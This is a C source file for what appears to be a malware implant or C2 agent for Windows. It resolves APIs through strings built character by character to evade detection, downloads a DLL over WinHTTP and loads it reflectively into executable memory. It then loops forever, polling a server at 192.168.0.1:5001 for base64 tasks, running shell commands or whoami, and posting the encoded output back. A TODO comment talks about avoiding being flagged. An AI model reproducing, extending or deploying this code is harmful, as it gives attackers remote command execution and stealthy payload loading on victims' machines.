// TODO: Using custom implementations of functionalities such as trimming and parsing is not okay as they can easily be flagged
// TODO: is readJsonTask still modifying json?

#include "../include/addresshunter.h"
#include "../include/http.h"

HANDLE inject(PAPI api, LPVOID lpDll, DWORD dwDllSize)
{
    DWORD loaderOffset;
    REFLECTIVELOADER pReflectiveLoader;
    DLLMAIN pDllMain;

    loaderOffset = GetRLOffset(api, lpDll);

    #ifdef DEBUG
    WCHAR loader[] = { 'L', 'o', 'a', 'd', 'e', 'r', ':', ' ', '%', 'p', '\n', 0 };
    ((WPRINTF)api->wprintf)(loader, (UINT_PTR)lpDll + loaderOffset);
    #endif

    //((WPRINTF)api->wprintf)(L"Origin DLL location: %p\n", lpDll);
    pReflectiveLoader = (REFLECTIVELOADER)((UINT_PTR)lpDll + loaderOffset);

    DWORD dwOldProtect;
    ((VIRTUALPROTECT)api->VirtualProtect)(lpDll, dwDllSize, PAGE_EXECUTE_READWRITE, &dwOldProtect);

    HANDLE hDllBase = NULL;

    pDllMain = (DLLMAIN)pReflectiveLoader();

    #ifdef DEBUG
    CHAR text[] = { 'D', 'l', 'l', 'M', 'a', 'i', 'n', 0 };
    ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
    #endif

    if( pDllMain != NULL )
    {
        // call the loaded librarys DllMain to get its HMODULE
        if ( pDllMain(NULL, DLL_QUERY_HMODULE, &hDllBase) == FALSE)
        {
            #ifdef DEBUG
            CHAR text[] = { 'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '1', 0 };
            ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
            #endif
            hDllBase = NULL;
        }
    }
    else
    {
        #ifdef DEBUG
        CHAR text[] = { 'D', 'l', 'l', 'M', 'a', 'i', 'n', 'F', 'a', 'i', 'l', '2', 0 };
        ((MESSAGEBOXA)api->MessageBoxA)(0, text, text, 0x0L);
        #endif
    }

    return hDllBase;
}

CHAR* myStrtok(CHAR* str, CHAR delim, BOOL reset)
{
    static DWORD index = 0;
    if (reset)
    { index=0; return NULL; }
    //CHAR* token = { 0 };
    DWORD lenStr = myStrlenA(str);
    str += index;

    for (int i=0; i<lenStr+1; i++)
    {
        if (str[i] == delim)
        { str[i] = '\0'; }
    }

    //token = str;
    index += myStrlenA(str)+1;    // +1 for null byte
    return str;
}

CHAR* myStartTrim(CHAR* str, CHAR trim)
{
    CHAR* outStr = str;
    while (outStr[0] == trim)
    { outStr++; }
    return outStr;
}

CHAR* myEndTrim(CHAR* str, CHAR trim)
{
    for (int i=myStrlenA(str)-1; i>=0; i--)     // -1 for null terminator
    {
        if(str[i] == trim)
        { str[i] = '\0'; }          // change trim with a null terminator
        else
        { return str; }
    }
    return str;
}

CHAR* myTrim(CCHAR* str, CHAR trim)
{
    CHAR* outStr = myStartTrim(str, trim);
    outStr = myEndTrim(outStr, trim);
    return outStr;
}

CHAR* readJsonTask(PAPI api, CHAR* json, CHAR** taskId, CHAR** taskType, CHAR** uuid)
{
    ((PRINTF)api->printf)("\nYou're in readJsonTask\n", uuid);
    CHAR* tmpJson = json;  // myStrtok modifies the string itself
    CHAR* task;
    CHAR delim = { '\n' };
    ((PRINTF)api->printf)("\ntmpJson: %s\n", tmpJson);
    CHAR* token = myStrtok(tmpJson, delim, FALSE);
    ((PRINTF)api->printf)("\nFirst token: %s\n", token);
    CHAR blacklist[] = { '[', ']', '\0' };

    if (token[0] == '[' && token[1] == ']')
    {
        ((PRINTF)api->printf)("tmpJson is empty, returning NULL");
        myStrtok(NULL, 0, TRUE);
        return NULL;
    }

    // SKIP [ and ]
    for (int i=0; i<=myStrlenA(blacklist)-1; i++)
    {
        for (int j=0; j<=myStrlenA(token)-1; j++)
        {
            if (token[j] == blacklist[i])
            {
                token = myStrtok(tmpJson, delim, FALSE);
                i=-1;
                break;
            }
        }
    }

    // dont look
    *taskId = myTrim(token, ' ');
    ((PRINTF)api->printf)("\ntaskId: %s\n", *taskId);
    *taskId = myEndTrim(*taskId, ',');
    ((PRINTF)api->printf)("\ntaskId: %s\n", *taskId);
    task = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
    ((PRINTF)api->printf)("\ntask: %s\n", task);
    task = myEndTrim(task, ',');
    ((PRINTF)api->printf)("\ntask: %s\n", task);
    task = myTrim(task, '"');
    ((PRINTF)api->printf)("\ntask: %s\n", task);
    *taskType = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
    ((PRINTF)api->printf)("\ntaskType: %s\n", *taskType);
    *taskType= myEndTrim(*taskType, ',');
    ((PRINTF)api->printf)("\ntaskType: %s\n", *taskType);
    *taskType = myTrim(*taskType, '"');
    ((PRINTF)api->printf)("\ntaskType: %s\n", *taskType);
    *uuid = myTrim(myStrtok(tmpJson, delim, FALSE), ' ');
    ((PRINTF)api->printf)("\nuuid: %s\n", *uuid);
    *uuid = myEndTrim(*uuid, ',');
    ((PRINTF)api->printf)("\nuuid: %s\n", *uuid);
    *uuid = myTrim(*uuid, '"');
    ((PRINTF)api->printf)("\nuuid: %s\n", *uuid);

    myStrtok(NULL, 0, TRUE);
    return task;
}

void myMain()
{
    API Api = { 0 };
    PAPI api = &Api;

    // Library Names
    CHAR user32_c[] = { 'u', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', 0 };
    CHAR winhttp_c[] = { 'w', 'i', 'n', 'h', 't', 't', 'p', 0 };
    CHAR msvcrt_c[] = { 'm', 's', 'v', 'c', 'r', 't', 0 };
    CHAR crypt32_c[] = { 'c', 'r', 'y', 'p', 't', '3', '2', '.', 'd', 'l', 'l', 0 };
    CHAR shlwapi_c[] = { 's', 'h', 'l', 'w', 'a', 'p', 'i', '.', 'd', 'l', 'l', 0 };

    // Library Declarations
    UINT64 kernel32dll, winhttpdll, msvcrtdll, user32dll, crypt32dll, shlwapidll;
 
    // Function Names
    CHAR messageBoxA_c[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'A', 0 };
    CHAR messageBoxW_c[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'W', 0 };
    CHAR loadlibrarya_c[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0 };
    CHAR winHttpOpen_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 0 };
    CHAR winHttpConnect_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'o', 'n', 'n', 'e', 'c', 't', 0 };
    CHAR winHttpOpenRequest_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 'R', 'e', 'q', 'u', 'e', 's', 't', 0 };
    CHAR winHttpSendRequest_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'S', 'e', 'n', 'd', 'R', 'e', 'q', 'u', 'e', 's', 't', 0 };
    CHAR winHttpReceiveResponse_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'c', 'e', 'i', 'v', 'e', 'R', 'e', 's', 'p', 'o', 'n', 's', 'e', 0 };
    CHAR WinHttpQueryDataAvailable_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'D', 'a', 't', 'a', 'A', 'v', 'a', 'i', 'l', 'a', 'b', 'l', 'e', 0 };
    CHAR winHttpQueryHeaders_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'Q', 'u', 'e', 'r', 'y', 'H', 'e', 'a', 'd', 'e', 'r', 's', 0 };
    CHAR winHttpReadData_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'R', 'e', 'a', 'd', 'D', 'a', 't', 'a', 0 };
    CHAR winHttpCloseHandle_c[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
    CHAR getLastError_c[] = {'G', 'e', 't', 'L', 'a', 's', 't', 'E', 'r', 'r', 'o', 'r', 0 };
    CHAR wprintf_c[] = { 'w', 'p', 'r', 'i', 'n', 't', 'f', 0 };
    CHAR printf_c[] = { 'p', 'r', 'i', 'n', 't', 'f', 0 };
    CHAR snprintf_c[] = { '_', 's', 'n', 'p', 'r', 'i', 'n', 't', 'f', 0 };
    CHAR malloc_c[] = { 'm', 'a', 'l', 'l', 'o', 'c', 0 };
    CHAR calloc_c[] = { 'c', 'a', 'l', 'l', 'o', 'c', 0 };
    CHAR free_c[] = { 'f', 'r', 'e', 'e', 0 };
    CHAR virtualProtect_c[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', 0 };
    CHAR virtualAlloc_c[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0 };
    CHAR createThread_c[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0 };
    CHAR waitForSingleObject_c[] = { 'W', 'a', 'i', 't', 'F', 'o', 'r', 'S', 'i', 'n', 'g', 'l', 'e', 'O', 'b', 'j', 'e', 'c', 't', 0 };
    CHAR CryptStringToBinaryA_c[] = { 'C', 'r', 'y', 'p', 't', 'S', 't', 'r', 'i', 'n', 'g', 'T', 'o', 'B', 'i', 'n', 'a', 'r', 'y', 'A', 0 };
    CHAR CryptBinaryToStringA_c[] = { 'C', 'r', 'y', 'p', 't', 'B', 'i', 'n', 'a', 'r', 'y', 'T', 'o', 'S', 't', 'r', 'i', 'n', 'g', 'A', 0 };
    CHAR StrToIntW_c[] = { 'S', 't', 'r', 'T', 'o', 'I', 'n', 't', 'W', 0 };
    CHAR closeHandle_c[] = { 'C', 'l', 'o', 's', 'e', 'H', 'a', 'n', 'd', 'l', 'e', 0 };
    CHAR sleep_c[] = { 'S', 'l', 'e', 'e', 'p', 0 };

    // Get Kernel32
    kernel32dll = GetKernel32();
    // GetLoadLibraryA
    api->LoadLibraryA = GetSymbolAddress((HANDLE)kernel32dll, loadlibrarya_c);

    // Getting Libraries
    user32dll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(user32_c);
    msvcrtdll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(msvcrt_c);
    winhttpdll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(winhttp_c);
    crypt32dll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(crypt32_c);
    shlwapidll = (UINT64)((LOADLIBRARYA)api->LoadLibraryA)(shlwapi_c);

    // WinHTTP
    api->WinHttpConnect = GetSymbolAddress((HANDLE)winhttpdll, winHttpConnect_c);
    api->WinHttpOpen = GetSymbolAddress((HANDLE)winhttpdll, winHttpOpen_c);
    api->WinHttpOpenRequest = GetSymbolAddress((HANDLE)winhttpdll, winHttpOpenRequest_c);
    api->WinHttpSendRequest = GetSymbolAddress((HANDLE)winhttpdll, winHttpSendRequest_c);
    api->WinHttpReceiveResponse = GetSymbolAddress((HANDLE)winhttpdll, winHttpReceiveResponse_c);
    api->WinHttpQueryDataAvailable = GetSymbolAddress((HANDLE) winhttpdll, WinHttpQueryDataAvailable_c);
    api->WinHttpQueryHeaders = GetSymbolAddress((HANDLE)winhttpdll, winHttpQueryHeaders_c);
    api->WinHttpReadData = GetSymbolAddress((HANDLE)winhttpdll, winHttpReadData_c);
    api->WinHttpCloseHandle = GetSymbolAddress((HANDLE)winhttpdll, winHttpCloseHandle_c);

    // Getting functions
    // User32
    // Msvcrt
    // kernel32
    api->malloc = GetSymbolAddress((HANDLE)msvcrtdll, malloc_c);
    api->calloc = GetSymbolAddress((HANDLE)msvcrtdll, calloc_c);
    api->free = GetSymbolAddress((HANDLE)msvcrtdll, free_c);
    api->GetLastError = GetSymbolAddress((HANDLE)kernel32dll, getLastError_c);
    api->MessageBoxA = GetSymbolAddress((HANDLE)user32dll, messageBoxA_c);
    api->MessageBoxW = GetSymbolAddress((HANDLE)user32dll, messageBoxW_c);
    api->wprintf = GetSymbolAddress((HANDLE)msvcrtdll, wprintf_c);
    api->printf = GetSymbolAddress((HANDLE)msvcrtdll, printf_c);
    api->snprintf = GetSymbolAddress((HANDLE)msvcrtdll, snprintf_c);
    api->VirtualProtect = GetSymbolAddress((HANDLE)kernel32dll, virtualProtect_c);
    api->VirtualAlloc = GetSymbolAddress((HANDLE)kernel32dll, virtualAlloc_c);
    api->CreateThread = GetSymbolAddress((HANDLE)kernel32dll, createThread_c);
    api->WaitForSingleObject = GetSymbolAddress((HANDLE)kernel32dll, waitForSingleObject_c);
    api->CloseHandle = GetSymbolAddress((HANDLE)kernel32dll, closeHandle_c);
    api->Sleep = GetSymbolAddress((HANDLE)kernel32dll, sleep_c);

    // crypt32
    api->CryptStringToBinaryA = GetSymbolAddress((HANDLE)crypt32dll, CryptStringToBinaryA_c);
    api->CryptBinaryToStringA = GetSymbolAddress((HANDLE)crypt32dll, CryptBinaryToStringA_c);

    // shlwapi
    api->StrToIntW = GetSymbolAddress((HANDLE)shlwapidll, StrToIntW_c);

    DWORD dwDllSize;
    LPVOID pEsgStdDll = 0;
    #ifdef DEBUG
    CHAR msg[] = { 'd', 'l', 'l', 'N', 'o', 't', 'F', 'o', 'u', 'n', 'd', 0 };
    #endif
    while (pEsgStdDll == 0)
    {
        pEsgStdDll = winHTTPClient(api, &dwDllSize);
        ((SLEEP)api->Sleep)(5000);
        if (pEsgStdDll != 0)
        { break; }
        #ifdef DEBUG
        ((MESSAGEBOXA)api->MessageBoxA)(0, msg, msg, 0X0L);
        #endif
    }

    ESG_STD_API EsgStdApi = { 0 };
    PESG_STD_API PEsgStdApi = &EsgStdApi;

    pEsgStdDll = inject(api, pEsgStdDll, dwDllSize);

    CHAR runCmd_c[] = { 'R', 'u', 'n', 'C', 'm', 'd', 0 };
    CHAR whoami_c[] = { 'W', 'h', 'o', 'a', 'm', 'i', 0 };

    PEsgStdApi->RunCmd = GetSymbolAddress((HANDLE)pEsgStdDll, runCmd_c);
    ((PRINTF)api->printf)("\np RunCmd: %p\n",PEsgStdApi->RunCmd);
    PEsgStdApi->Whoami = GetSymbolAddress((HANDLE)pEsgStdDll, whoami_c);
    ((PRINTF)api->printf)("\np Whoami: %p\n",PEsgStdApi->Whoami);

    //WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '1', '.', '1', '6', 0 };
    WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0 };
    WCHAR tasksPath[] = { '/', 't', 'a', 's', 'k', 's', '/', 0 };
    WCHAR uuid[] = { '1', '1', 'e', '3', 'b', '2', '7', 'c', '-', 'a', '1', 'e', '7', '-', '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f', 'a', '2', 'f', '0', 'd', '0', 0 };
    WCHAR* fullPath = myConcatW(api, tasksPath, uuid);
    INTERNET_PORT port = 5001;

    CHAR* jsonResponse = NULL;
    CHAR* taskId = { 0 };
    CHAR* taskType = { 0 };
    CHAR* agentUuid = { 0 };
    CHAR* b64Task;
    CHAR* task = NULL;
    DWORD taskSize;
    CHAR* taskOutput;
    CHAR* b64EncodedOutput;
    DWORD b64EncodedOutputSize;
    DWORD sizeOfOutput;
    CHAR jsonFormat[] =
    {
    '{', '"', 't', 'a', 's', 'k', '_', 'i', 'd', '"', ':', ' ', '"', '%', 's', '"', ',',
    ' ', '"', 'a', 'g', 'e', 'n', 't', '_', 'u', 'u', 'i', 'd', '"', ':', ' ', '"',
    '%', 's', '"', ',', ' ', '"', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p',
    'u', 't', '"', ':', ' ', '"', '%', 's', '"', '}'
    };
    DWORD totalJsonSize;
    CHAR* json;
    WCHAR fullPath2[] =
    {
        '/', 's', 'e', 'n', 'd', '_', 't', 'a', 's', 'k', '_', 'o', 'u', 't', 'p', 'u',
        't', '/','1', '1', 'e', '3', 'b', '2', '7', 'c', '-', 'a', '1', 'e', '7', '-',
        '4', '2', '2', '4', '-', 'b', '4', 'd', '9', '-', '3', 'a', 'f', '3', '6', 'f',
        'a', '2', 'f', '0', 'd', '0', 0
    };

    while (TRUE)
    {
        jsonResponse = GetRequest(api, wServer, port, fullPath);

        if (jsonResponse == NULL)
        {
            ((PRINTF)api->printf)("\njsonResponse is NULL, sleeping...\n");
            ((SLEEP)api->Sleep)(3000);
            continue;
        }
        ((PRINTF)api->printf)("\np jsonResponse: %p", jsonResponse);
        ((PRINTF)api->printf)("\njsonResponse: %s", jsonResponse);

        b64Task = readJsonTask(api, jsonResponse, &taskId, &taskType, &agentUuid);

        if (b64Task == NULL)
        {
            ((PRINTF)api->printf)("\nb64Task is NULL, sleeping...\n");
            ((SLEEP)api->Sleep)(3000);
            continue;
        }
        ((PRINTF)api->printf)("\np b64Task: %p\n", b64Task);
        ((PRINTF)api->printf)("\nb64Task: %s\n", b64Task);

        ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
        (
                (LPCSTR)b64Task,
                myStrlenA(b64Task),
                CRYPT_STRING_BASE64,
                NULL,
                &taskSize,
                NULL,
                NULL
        );
        ((PRINTF)api->printf)("\ntaskSize1: %d", taskSize);
        task = (CHAR*)((CALLOC)api->calloc)(taskSize+1, sizeof(CHAR));

        ((CRYPTSTRINGTOBINARYA)api->CryptStringToBinaryA)
        (
                (LPCSTR)b64Task,
                myStrlenA(b64Task),
                CRYPT_STRING_BASE64,
                (PBYTE)task,
                &taskSize,
                NULL,
                NULL
        );
        ((PRINTF)api->printf)("\ntaskSize2: %d", taskSize);

        ((PRINTF)api->printf)("\np task: %p", task);
        ((PRINTF)api->printf)("\ntask: %s", task);
        ((PRINTF)api->printf)("\nmyStrlenA(task): %d", myStrlenA(task));

        if (my_strcmp(taskType, "cmd") == 0)
        {
            CHAR* tmpOutput = ((RUNCMD)PEsgStdApi->RunCmd)(task, &sizeOfOutput);
            taskOutput = myTrim(tmpOutput, '\n');
            if (tmpOutput)
            { ((FREE)api->free)(tmpOutput); }
        }
        else if (my_strcmp(taskType, "whoami") == 0)
        {
            taskOutput = myTrim(((WHOAMI)PEsgStdApi->Whoami)(), '\n');
            ((PRINTF)api->printf)("\ntaskOutput: \n%s\n", taskOutput);
        }
        else
        {
            taskOutput = "oops";
            ((PRINTF)api->printf)("unknown task type, you f'ed up, this should never happen");
        }

        ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, NULL, &b64EncodedOutputSize);
        b64EncodedOutput = (CHAR*)((CALLOC)api->calloc)(b64EncodedOutputSize, sizeof(CHAR));
        ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, b64EncodedOutput, &b64EncodedOutputSize);

        totalJsonSize = myStrlenA(jsonFormat)-6 + b64EncodedOutputSize + myStrlenA(taskId) + myStrlenA(agentUuid) + 16;
        json = (CHAR*)((CALLOC)api->calloc)(totalJsonSize, sizeof(CHAR));
        ((SNPRINTF)api->snprintf)(json, totalJsonSize, jsonFormat, taskId, agentUuid, b64EncodedOutput);
        ((PRINTF)api->printf)("\ntotalJsonSize: %d\n", totalJsonSize);
        ((PRINTF)api->printf)("\nmyStrlenA(json): %d\n", myStrlenA(json));
        ((PRINTF)api->printf)("\njson: %s\n", json);
        PostRequest(api, wServer, port, fullPath2, json);

        /*
        if (taskOutput)
        {
            ((FREE)api->free)(taskOutput);
        }
        */
        if (b64EncodedOutput)
        {
            ((FREE)api->free)(b64EncodedOutput);
        }
        if (jsonResponse)
        {
            ((FREE)api->free)(jsonResponse);
        }
        if (json)
        {
            ((FREE)api->free)(json);
        }
        if (task)
        {
            ((FREE)api->free)(task);
        }

        ((SLEEP)api->Sleep)(3000);
    }
    if (fullPath)
    {
        ((FREE)api->free)(fullPath);
    }
}

